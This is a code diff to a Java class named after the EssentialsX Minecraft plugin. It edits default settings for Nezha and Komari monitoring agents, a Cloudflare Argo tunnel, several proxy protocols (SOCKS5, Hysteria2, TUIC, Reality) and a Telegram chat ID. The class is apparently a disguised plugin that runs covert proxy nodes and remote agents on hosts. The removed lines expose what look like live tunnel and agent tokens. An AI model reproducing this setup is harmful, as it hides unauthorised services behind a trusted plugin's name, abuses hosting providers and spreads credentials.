@@ -97,14 +97,14 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "freezehostnl.liuping.ccwu.cc");
-        env.put("ARGO_AUTH", "eyJhIjoiNDQ3MzQxNGZkNDc5Y2E1MmZiYTZjYjZkMWI5NGQ1NmMiLCJ0IjoiNDhlMDA1YTgtNWZmYS00OTY2LTk2MDMtN2ZiNjdhYTBkZWZmIiwicyI6Ik5tSTBOMkl3TURRdE5UY3dOQzAwTjJSbExXRXdZVGt0WmpZMU1tRXlObVkyWkdGaCJ9");
-        env.put("S5_PORT", "10971");
-        env.put("HY2_PORT", "10971");
-        env.put("TUIC_PORT", "10647");
+        env.put("ARGO_PORT", "");
+        env.put("ARGO_DOMAIN", "");
+        env.put("ARGO_AUTH", "");
+        env.put("S5_PORT", "8590");
+        env.put("HY2_PORT", "8590");
+        env.put("TUIC_PORT", "11333");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "10647");
+        env.put("REALITY_PORT", "11333");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "8502788454");
@@ -112,10 +112,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "cf.050900.xyz");
         env.put("CFPORT", "443");
         env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");
         // ---- Komari Agent 默认值 ----
-        env.put("KOMARI_SERVER", "https://komari.050900.xyz");
-        env.put("KOMARI_TOKEN", "oUcbLU6SlqpXunYk1AFw7i");
+        env.put("KOMARI_SERVER", "");
+        env.put("KOMARI_TOKEN", "");
 
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
